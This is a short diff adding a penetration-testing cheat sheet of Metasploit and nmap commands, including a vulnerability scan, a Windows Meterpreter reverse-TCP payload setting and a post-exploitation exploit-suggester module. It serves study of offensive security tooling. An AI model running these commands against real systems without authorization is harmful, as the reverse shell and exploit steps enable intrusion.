@@ -1,0 +1,7 @@
+systemctl start postgresql - Starting Service for msfconsole
+msfdb init - Updating the MSF database
+nmap --script vuln - nmap scan for vulnabilities
+set PAYLOAD windows/meterpreter/reverse_tcp - payload for exploits 
+run post/multi/recon/local_exploit_suggester - exploit to check for vunls after gaining access to the system
+getuid - get User ID information from the system that we are connected to.
+
